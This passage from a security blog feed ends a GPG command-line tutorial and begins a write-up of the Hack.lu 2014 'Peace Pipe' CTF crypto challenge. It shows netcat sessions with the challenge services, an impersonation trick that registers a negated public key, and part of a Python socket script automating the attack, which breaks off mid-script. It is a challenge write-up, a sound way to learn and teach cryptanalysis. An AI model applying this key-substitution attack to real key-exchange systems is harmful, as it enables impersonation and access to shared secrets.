&lt;p&gt;With someone's &lt;strong&gt;public key&lt;/strong&gt;, you can &lt;strong&gt;encrypt&lt;/strong&gt; messages that can only be decrypted with her secret key. You can also &lt;strong&gt;verify signatures&lt;/strong&gt; that were generated with her secret key.&lt;/p&gt;
&lt;p&gt;In the other hand, with your secret key you can &lt;strong&gt;decrypt&lt;/strong&gt; messages that were encrypted using your public key. You can also and  &lt;strong&gt;sign messages&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;With GPG, you  encrypt messages using the &lt;code&gt;--encrypt&lt;/code&gt; flag.&lt;/p&gt;
&lt;p&gt;The command below encrypts the message signing with your private key (to guarantee that is coming from you). It also generates the message in a text format, instead of raw bytes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --encrypt --sign --armor -r PERSON_EMAIL FILE_TO_BE_ENCRYPTED
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If you want to be able to read this message with your own email address, you should add another recipient flag &lt;code&gt;-r&lt;/code&gt; with your email address.&lt;/p&gt;
&lt;p&gt;To decrypt a message, type:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg FILENAME
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;VIII. Revoking a key&lt;/h3&gt;
&lt;p&gt;Whenever you need to revoke a key (because it might be compromised, for example), you can generate a revocation certificate with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --output my_revocation.asc --gen-revoke KEY_NAME
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To import the revocation into your keyring:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --import my_revocation.asc
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finally, this command sends the revoked key to the public key server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --keyserver pgp.mit.edu --send-keys KEY_NAME
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Final Comments&lt;/h2&gt;
&lt;p&gt;If you prefer a GUI instead of the command line, I strongly recommend  &lt;a href="https://apps.fedoraproject.org/packages/seahorse/bugs"&gt;seahorse&lt;/a&gt;. It makes really easy to manage all your keys (not only OpenPGP) and passwords.&lt;/p&gt;
&lt;p&gt;Another nice (alpha) project is &lt;a href="https://keybase.io/"&gt;keybase.io&lt;/a&gt;. It's kind of a web of trust social network, where you can sign your key with your public profiles. Check &lt;a href="https://keybase.io/bt3"&gt;mine here&lt;/a&gt;. Encryption and decryption can be done in the command line with their &lt;a href="https://keybase.io/docs/command_line"&gt;node.js&lt;/a&gt; application. I don't trust uploading my private key anywhere, but I do think that the idea is better than a simple public key server.&lt;/p&gt;
&lt;p&gt;Finally, a word about browser plugins. Although there are several of them to encrypt webmail with OpenPGP,  such as &lt;a href="https://chrome.google.com/webstore/detail/mymail-crypt-for-gmail/jcaobjhdnlpmopmjhijplpjhlplfkhba?hl=en-US"&gt;mymail-crypt&lt;/a&gt;  or &lt;a href="https://www.mailvelope.com/"&gt;Mailvelope&lt;/a&gt;, I particularly don't recommend this solution. If you are serious about ensuring your long-term privacy, the safest way to go is to use a text editor to write your email message, encrypting the message outside of the web browser, and then cutting and pasting into your webmail interface. This will guarantee that only the recipient will be able to read your email. The choice is yours. If you really need something in your browser,  the creator of &lt;a href="https://crypto.cat/"&gt;Cryptocat&lt;/a&gt; recently released &lt;a href="https://minilock.io/"&gt;minilock&lt;/a&gt;. This tool  uses  &lt;a href="http://en.wikipedia.org/wiki/Curve25519"&gt;Curve25519 elliptic curve cryptography&lt;/a&gt; (the sames as in Cryptocat) so that the public keys are much shorter (and easier to share). Remember,  it's a new app, so it might not yet be the best choice for high-stakes environment (but  it's  worth keeping tabs on this project).&lt;/p&gt;</summary><category term="PGP"></category><category term="GPG"></category></entry><entry><title>The Peace Pipe at Hack.lu's Final CTF 2014</title><link href="http://bt3gl.github.io/the-peace-pipe-at-hacklus-final-ctf-2014.html" rel="alternate"></link><updated>2014-10-23T06:30:00-04:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-10-23:the-peace-pipe-at-hacklus-final-ctf-2014.html</id><summary type="html">&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/LXaaRsf.png" /&gt;&lt;/p&gt;
&lt;p&gt;Last week was the &lt;a href="https://wildwildweb.fluxfingers.net/scoreboard"&gt;Hack.lu&lt;/a&gt; Final CTF. In this post I  discuss  one of my favorite  crypto problems in that CTF: the "Peace Pipe".&lt;/p&gt;
&lt;h2&gt;Understanding the Problem&lt;/h2&gt;
&lt;p&gt;The problem starts with this weird story:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;After&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;day&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;you&lt;/span&gt; &lt;span class="n"&gt;sit&lt;/span&gt; &lt;span class="n"&gt;around&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;campfire&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;wild&lt;/span&gt; &lt;span class="n"&gt;wild&lt;/span&gt; &lt;span class="n"&gt;web&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;few&lt;/span&gt; &lt;span class="n"&gt;Sioux&lt;/span&gt; &lt;span class="n"&gt;you&lt;/span&gt; &lt;span class="n"&gt;met&lt;/span&gt; &lt;span class="n"&gt;today&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="n"&gt;To&lt;/span&gt; &lt;span class="n"&gt;celebrate&lt;/span&gt; &lt;span class="n"&gt;friendship&lt;/span&gt; &lt;span class="n"&gt;one&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;them&lt;/span&gt; &lt;span class="n"&gt;takes&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt; &lt;span class="n"&gt;his&lt;/span&gt; &lt;span class="n"&gt;wooden&lt;/span&gt; &lt;span class="n"&gt;peace&lt;/span&gt; &lt;span class="n"&gt;pipe&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;minutes&lt;/span&gt; &lt;span class="n"&gt;later&lt;/span&gt; &lt;span class="n"&gt;everyone&lt;/span&gt; &lt;span class="n"&gt;seems&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;be&lt;/span&gt; &lt;span class="n"&gt;pretty&lt;/span&gt; &lt;span class="n"&gt;dizzy&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="n"&gt;You&lt;/span&gt; &lt;span class="n"&gt;remember&lt;/span&gt; &lt;span class="n"&gt;that&lt;/span&gt; &lt;span class="n"&gt;their&lt;/span&gt; &lt;span class="n"&gt;war&lt;/span&gt; &lt;span class="n"&gt;chief&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Makawee&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;started&lt;/span&gt; &lt;span class="n"&gt;something&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;say&lt;/span&gt; &lt;span class="n"&gt;about&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;secret&lt;/span&gt; &lt;span class="n"&gt;tipi&lt;/span&gt; &lt;span class="n"&gt;filled&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;fire&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;water&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;good&lt;/span&gt; &lt;span class="n"&gt;stuff&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt; &lt;span class="n"&gt;But&lt;/span&gt; &lt;span class="n"&gt;when&lt;/span&gt; &lt;span class="n"&gt;he&lt;/span&gt; &lt;span class="n"&gt;noticed&lt;/span&gt; &lt;span class="n"&gt;your&lt;/span&gt; &lt;span class="n"&gt;interest&lt;/span&gt; &lt;span class="n"&gt;he&lt;/span&gt; &lt;span class="n"&gt;immediately&lt;/span&gt; &lt;span class="n"&gt;stopped&lt;/span&gt; &lt;span class="n"&gt;talking&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="n"&gt;You&lt;/span&gt; &lt;span class="n"&gt;recall&lt;/span&gt; &lt;span class="n"&gt;that&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Makawee&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;spoke&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Wahkoowah&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;about&lt;/span&gt; &lt;span class="n"&gt;that&lt;/span&gt; &lt;span class="n"&gt;issue&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;but&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="n"&gt;ended&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;fight&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="n"&gt;Since&lt;/span&gt; &lt;span class="n"&gt;then&lt;/span&gt; &lt;span class="n"&gt;Makawee&lt;/span&gt; &lt;span class="n"&gt;wouldnt&lt;/span&gt; &lt;span class="n"&gt;talk&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;Wahkoowah&lt;/span&gt; &lt;span class="n"&gt;anymore&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;While&lt;/span&gt; &lt;span class="n"&gt;they&lt;/span&gt; &lt;span class="n"&gt;argued&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Chapawee&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;wrote&lt;/span&gt; &lt;span class="n"&gt;something&lt;/span&gt; &lt;span class="n"&gt;down&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="n"&gt;Maybe&lt;/span&gt; &lt;span class="n"&gt;you&lt;/span&gt; &lt;span class="n"&gt;can&lt;/span&gt; &lt;span class="n"&gt;exploit&lt;/span&gt; &lt;span class="n"&gt;their&lt;/span&gt; &lt;span class="n"&gt;dizzyness&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;find&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;location&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;tipi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then it gives us three &lt;em&gt;ports&lt;/em&gt; in the &lt;em&gt;host&lt;/em&gt;. With the first one, we  talk to &lt;strong&gt;Chapawee&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;wildwildweb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fluxfingers&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="mi"&gt;1432&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;With the second, we talk to &lt;strong&gt;Wankoowah&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;wildwildweb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fluxfingers&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="mi"&gt;1433&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finally, with the third, we talk to &lt;strong&gt;Makawee&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;wildwildweb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fluxfingers&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="mi"&gt;1434&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It was obvious that  this game was about fooling our fellow &lt;em&gt;stoned&lt;/em&gt; native-Americans.&lt;/p&gt;
&lt;h3&gt;A Dialogue with Chapawee&lt;/h3&gt;
&lt;p&gt;When we &lt;em&gt;netcat&lt;/em&gt; to &lt;strong&gt;Chapawee&lt;/strong&gt; he answers:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt; nc wildwildweb.fluxfingers.net 1432
Hi I&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;m Chapawee. I know the truth about the stars
Say stars &lt;span class="k"&gt;for &lt;/span&gt;more
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We answer &lt;em&gt;stars&lt;/em&gt; and get a funny menu:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;        I can tell you the truth about
        * constellation
        * namestar &lt;span class="o"&gt;[&lt;/span&gt;starname&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;key_of_truth&lt;span class="o"&gt;]&lt;/span&gt;   Adds a public key to a user.
                                               Existing users cannot be
                                               overwritten. Input is
                                               &lt;span class="o"&gt;[&lt;/span&gt;a-f0-9&lt;span class="o"&gt;]{&lt;/span&gt;1,700&lt;span class="o"&gt;}&lt;/span&gt;.
        * showstar &lt;span class="o"&gt;[&lt;/span&gt;starname&lt;span class="o"&gt;]&lt;/span&gt;                  Reads the public key from the
                                               database.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The first option &lt;em&gt;constellation&lt;/em&gt;, shows a very interesting scheme:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/OzVjrVh.png" /&gt;&lt;/p&gt;
&lt;p&gt;Choosing the options &lt;strong&gt;namestar&lt;/strong&gt; we are able to pick a (new) name to add a key. Picking the option &lt;strong&gt;showstar&lt;/strong&gt; we are able to see the key for some name (for example, for Wahkoowar, Makawee, or any new name we had added before).&lt;/p&gt;
&lt;p&gt;So, from the above scheme, we know:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;How a &lt;strong&gt;message&lt;/strong&gt; (t) is created with someone's public key, a &lt;strong&gt;random rational number&lt;/strong&gt; (r_w), and a given &lt;strong&gt;modulus number&lt;/strong&gt; (p). The only unknown here is r_w, which is a rational number (Q). This mean that any plans to brute force the messages wouldn't work (however, if r_w was an integer, this task could be achieved).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Everyone has a private key that is modulus p. We never learn anything about anyone's private keys. We just know that they could be of the order of p (which is a really large number, ~1E2048).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Wahkoowah and Makawee have a shared secret key. The way they share this key without knowing each other's private key is by this tricky transformation:&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/TwxShK9.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;Notice that we can move the multiplications' modulus operation to the end, due to &lt;a href="http://en.wikipedia.org/wiki/Modular_arithmetic#Congruence_relation"&gt;this propriety&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In conclusion, all we need to do is to convince Wahkoowah  that we are Makawee (by telling him we are Makawee, so he can use his public key, and by sending him a correct &lt;em&gt;t_m&lt;/em&gt;). If this works, he will give us a token. Then, if we send this token to Makawee, we get our flag.&lt;/p&gt;
&lt;h3&gt;A Dialogue with Wankoowah&lt;/h3&gt;
&lt;p&gt;Now, let's see what Wankoowah has to say:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;nc wildwildweb.fluxfingers.net 1433
Hi, I&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;m Wahkoowah. Who are you? Too foggy...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We try a couple of possibilities to check the outputs:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;nc wildwildweb.fluxfingers.net 1433
Hi, I&lt;span class="s1"&gt;&amp;#39;m Wahkoowah. Who are you? Too foggy...&lt;/span&gt;
&lt;span class="s1"&gt;noone&lt;/span&gt;
&lt;span class="s1"&gt;Hi noone&lt;/span&gt;
&lt;span class="s1"&gt;Cannot find it...&lt;/span&gt;
&lt;span class="s1"&gt;Ncat: Broken pipe.&lt;/span&gt;

&lt;span class="s1"&gt;$ nc wildwildweb.fluxfingers.net 1433&lt;/span&gt;
&lt;span class="s1"&gt;Hi, I&amp;#39;&lt;/span&gt;m Wahkoowah. Who are you? Too foggy...
makawee
Oh its you, Im so sorry. Can we talk now?
This is your key of truth
50e7e1957c1786a9442f0c9f372ec19f74f52839e9e38849b47438153f9d2483213a43ad2d988fab4a8707922060aaefe6504a70637596fbcf9d58362b23e5d5e2177fd4e919b80437bab51eda931e065b6d66fce343d7cb2b7c1ca26214792d461895095ae58354af0dec6e63869007e23835892f26aabc96fe3d9084a829b4d6c5b92c6f3e0dd9a70cbd5c72d6434f2b94d21c3b0c58a288c140642b813ffb1b632bc358b3a6af0124902acd8792202c848de7f9d5d98bee51ca69040c8a2457ad3fa6276d6510701b9a875df612e035322cad06579a0a11f5e7cb4ebb7b69171c38585fc0f4fe07b0c889442397029d05dc801026a0648d7aa8c847420e9c
With magic I did this:
922a7f4b150eb83eab929e2a44bcbbb45435851262a6e7b84d2777d995ffbc315a2e57a580f4982797b45efde6d30b493880ecea33fe26e6c8ff636b75b7cb3f647f0c6f606249bc48ef09bd20738cf472bf47c7f52b9e11afcefc1548155637b0d2054d37cd74301e534208408074938ae4e7b54ef50fa0a39cb090dd34de7a4040024ba2394bac62262ccda529d2d69effe24338f0ec1b842539d2b89b081fa77a266a7c9f62c25d2a1ee1af3da8054d79d87ae88da61b8333e1fc195d2957341458700a3be70c98e1a8ab35bfe527ff6a2f255c66d753d03c59404993f1ed295a722bf1d0241eec9c01efe06e3cd5b845e84de3d29de17f9b68351bdc2d65
We &lt;span class="k"&gt;continue &lt;/span&gt;our conversation, right?
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;em&gt;magic&lt;/em&gt; is the message &lt;em&gt;t_w&lt;/em&gt;, created with Makawee's public key. Wahkoowah then ask for &lt;em&gt;t_m&lt;/em&gt;...&lt;/p&gt;
&lt;h3&gt;A Dialogue with Makawee&lt;/h3&gt;
&lt;p&gt;Let's see what Makawee has to say:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;nc wildwildweb.fluxfingers.net 1434
Hi, I&lt;span class="s1"&gt;&amp;#39;m, Makawee, and you are? Too bright here...&lt;/span&gt;
&lt;span class="s1"&gt;noone&lt;/span&gt;
&lt;span class="s1"&gt;noone ... do I know you?&lt;/span&gt;
&lt;span class="s1"&gt;Cannot find it...&lt;/span&gt;

&lt;span class="s1"&gt;Ncat: Broken pipe.&lt;/span&gt;

&lt;span class="s1"&gt;$ nc wildwildweb.fluxfingers.net 1434&lt;/span&gt;
&lt;span class="s1"&gt;Hi, I&amp;#39;&lt;/span&gt;m, Makawee, and you are? Too bright here...
wahkoowah
I dont talk to you anymore. That thing with my daughter...

Ncat: Broken pipe.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mmmm, we need to make Makawee use Wankoowah's key without him knowing it!&lt;/p&gt;
&lt;p&gt;Since Chapawee allows us to add keys to names, let's create some name with Wahkoowah's key (say "mrwhite") and send this to Makawee:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;nc wildwildweb.fluxfingers.net 1432
Hi I&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;m Chapawee. I know the truth about the stars
Say stars &lt;span class="k"&gt;for &lt;/span&gt;more
stars

        I can tell you the truth about
        * stars
        * constellation
        * namestar &lt;span class="o"&gt;[&lt;/span&gt;starname&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;key_of_truth&lt;span class="o"&gt;]&lt;/span&gt;   Adds a public key to a user.
                                               Existing users cannot be
                                               overwritten. Input is
                                               &lt;span class="o"&gt;[&lt;/span&gt;a-f0-9&lt;span class="o"&gt;]{&lt;/span&gt;1,700&lt;span class="o"&gt;}&lt;/span&gt;.
        * showstar &lt;span class="o"&gt;[&lt;/span&gt;starname&lt;span class="o"&gt;]&lt;/span&gt;                  Reads the public key from the
                                               database.

namestar mrwhite 218b783ec5676cbddd378ceb724820444599f22cdcfda0a5a195b3a8fbf4ab5c915703420ad3b84531c54b838b23858fb84fcaf04d4932d4b9ef861c7ae9b635c9d3f56dfb100aa47297afcd94df41efa9f5ecba6483c5328e43ec457027ee4efcecefa094a83945106d7da1878c1f47516c2f2578170eeb36955d8bd16e0d106f9e2effe9debff41e551db4ac2e87bc8a9378d8eadb042bee18f4ad72ab721833a27154a7318b8cbe6f98fb3c82da32d1688fdcdb718fb15d9d5e6276b037cef62d953c09b23ebe90d0b13f61cd1643e5e1b0a433d5e2522ec5a028817891b6df444e983e1e0ff2356044fea67c616dce6b4bd53b17ea8bc51ef816ab8f2d9e
Add the star to the sky...
Set the star &lt;span class="k"&gt;for &lt;/span&gt;mrwhite: 218b783ec5676cbddd378ceb724820444599f22cdcfda0a5a195b3a8fbf4ab5c915703420ad3b84531c54b838b23858fb84fcaf04d4932d4b9ef861c7ae9b635c9d3f56dfb100aa47297afcd94df41efa9f5ecba6483c5328e43ec457027ee4efcecefa094a83945106d7da1878c1f47516c2f2578170eeb36955d8bd16e0d106f9e2effe9debff41e551db4ac2e87bc8a9378d8eadb042bee18f4ad72ab721833a27154a7318b8cbe6f98fb3c82da32d1688fdcdb718fb15d9d5e6276b037cef62d953c09b23ebe90d0b13f61cd1643e5e1b0a433d5e2522ec5a028817891b6df444e983e1e0ff2356044fea67c616dce6b4bd53b17ea8bc51ef816ab8f2d9e
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sending it to Makawee:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;nc wildwildweb.fluxfingers.net 1434
Hi, I&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;m, Makawee, and you are? Too bright here...
mrwhite
mrwhite ... &lt;span class="k"&gt;do &lt;/span&gt;I know you?
Disguise does not &lt;span class="nb"&gt;help&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Oh no, the plan did not work! We can't send &lt;strong&gt;exactly&lt;/strong&gt; Wahkoowah's key! We need to be even more tricky...&lt;/p&gt;
&lt;h2&gt;Crafting a Solution&lt;/h2&gt;
&lt;h3&gt;Master in Disguising&lt;/h3&gt;
&lt;p&gt;Every key in this problem is given by &lt;em&gt;mudulus p&lt;/em&gt;. This means that we have infinite values that map to the same original key. My first attempt was to multiply the original key by p, so that, when it receives the modulus operation, it circles once more returning to the original value.&lt;/p&gt;
&lt;p&gt;It didn't work. The reason is that p is too large. When multiplied by the key (that is large itself) we loose precision and we don't go back to the original value. We need to keep the values in the same scale!&lt;/p&gt;
&lt;p&gt;Let's take a look again at the way the messages are generated:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/Hz5uf7X.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;We notice that the public key is exponentiated by r_m. It means that, if r_m is an even number, two values of the public key are mapped to the same value of the final message: +pubk and -pubk.&lt;/p&gt;
&lt;p&gt;That's all we need! We are going to disguise Makawee by creating a &lt;em&gt;star&lt;/em&gt; with the negative value of Wahkoowah's key.&lt;/p&gt;
&lt;h3&gt;Automatizing the Process and getting the Flag!&lt;/h3&gt;
&lt;p&gt;All right, now we know how to make Wahkoowah and Makawee talk and how to get &lt;em&gt;t_m&lt;/em&gt; and &lt;em&gt;t_w&lt;/em&gt;. We are ready to generate the token that will lead us to the flag.&lt;/p&gt;
&lt;p&gt;Notice again that since these messages are generated with random numbers, they will differ each time. However, we know from above that they carry unique information that leads to a common key (and the flag). I wrote the following script to automatize the process:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;

&lt;span class="n"&gt;PORTm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1434&lt;/span&gt;
&lt;span class="n"&gt;PORTw&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1433&lt;/span&gt;
&lt;span class="n"&gt;HOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;wildwildweb.fluxfingers.net&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;peace_pipe&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;

    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot; Get the magic message from some user to calculate rm &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="c"&gt;# create sockets&lt;/span&gt;
    &lt;span class="n"&gt;sm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sw&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c"&gt;# connect to w&lt;/span&gt;
    &lt;span class="n"&gt;sw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PORTw&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;sw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;makawee&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sec&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
